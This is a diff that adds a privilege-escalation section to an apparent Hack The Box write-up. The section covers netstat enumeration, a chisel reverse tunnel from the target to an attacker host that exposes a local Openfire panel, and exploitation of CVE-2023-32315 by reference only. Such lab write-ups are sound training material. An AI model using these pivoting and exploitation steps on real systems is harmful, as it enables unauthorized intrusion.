@@ -171,3 +171,43 @@ Mode                LastWriteTime         Length Name
 PS C:\Users\svc_openfire\Desktop> type user.txt 
 818a************************04d8
 ```
+
+## Privileges escalation
+
+Internal enumeration of the host's ports discovered, that the target is hosting `openfire` server on ports 9090 and 9091:
+
+```bash
+PS C:\Users\svc_openfire\Desktop> netstat -ano | findstr '127.0.0.1:'
+  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2540
+  TCP    127.0.0.1:389          127.0.0.1:49779        ESTABLISHED     636
+  TCP    127.0.0.1:9090         0.0.0.0:0              LISTENING       812
+  TCP    127.0.0.1:9091         0.0.0.0:0              LISTENING       812
+
+  ...SNIP...
+```
+
+As the Windows does not utilize ssh, we will need other means to forward ports to the attacker machine. We can use `chisel` to do this.
+
+After transfering the `chisel` to the target, we execute the server and client commands on the attacker and target:
+
+Attacker:
+```bash
+chisel server -p 1234 --reverse
+```
+
+Target:
+```bash
+chisel client xx.xx.xx.xx:1234 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091
+```
+
+Opening the `localhost:9090` in the browser will greet us with login page:
+
+![11-openfire](https://github.com/amalcew/htb-writeups/assets/73908014/018297ba-9f27-40c3-8270-1b73bc768b97)
+
+After logging with the `svc_openfire` credentials, we are logged into the system:
+
+![12-openfire2](https://github.com/amalcew/htb-writeups/assets/73908014/51147a87-cf43-4769-be11-82e656a24d73)
+
+Further exploration of the panel revealed, that the service is vulnerable to [CVE-2023-32315](https://www.vicarius.io/vsociety/posts/cve-2023-32315-path-traversal-in-openfire-leads-to-rce). Following the instructions and crafting the payload allows to leverage the vulnerability and gain root access over the target.
+
+![13-root](https://github.com/amalcew/htb-writeups/assets/73908014/e708f4af-9041-49b4-8930-bc21e2318c2e)
